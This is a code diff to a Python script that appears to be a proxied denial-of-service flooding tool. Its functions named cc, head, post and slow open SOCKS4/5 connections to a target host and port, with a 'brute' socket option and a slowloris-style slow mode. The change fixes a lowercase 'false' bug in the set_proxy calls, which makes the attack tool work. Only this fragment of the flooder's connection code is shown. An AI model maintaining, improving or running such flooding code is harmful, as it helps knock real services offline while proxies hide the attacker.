@@ -308,9 +308,9 @@ def cc(event,socks_type,ind_rlock):
 		try:
 			s = socks.socksocket()
 			if socks_type == 4:
-				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]),false)
+				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]),False)
 			if socks_type == 5:
-				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]),false)
+				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]),False)
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
@@ -349,9 +349,9 @@ def head(event,socks_type,ind_rlock):#HEAD MODE
 		try:
 			s = socks.socksocket()
 			if socks_type == 4:
-				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]),False)
 			if socks_type == 5:
-				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]),False)
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
@@ -387,9 +387,9 @@ def post(event,socks_type,ind_rlock):
 		try:
 			s = socks.socksocket()
 			if socks_type == 4:
-				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]),false)
+				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]),False)
 			if socks_type == 5:
-				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]),false)
+				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]),False)
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
@@ -421,9 +421,9 @@ def slow(conn,socks_type):
 		try:
 			s = socks.socksocket()
 			if socks_type == 4:
-				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]),false)
+				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]),False)
 			if socks_type == 5:
-				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]),false)
+				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]),False)
 			s.settimeout(1)
 			s.connect((str(target), int(port)))
 			if str(port) == '443':
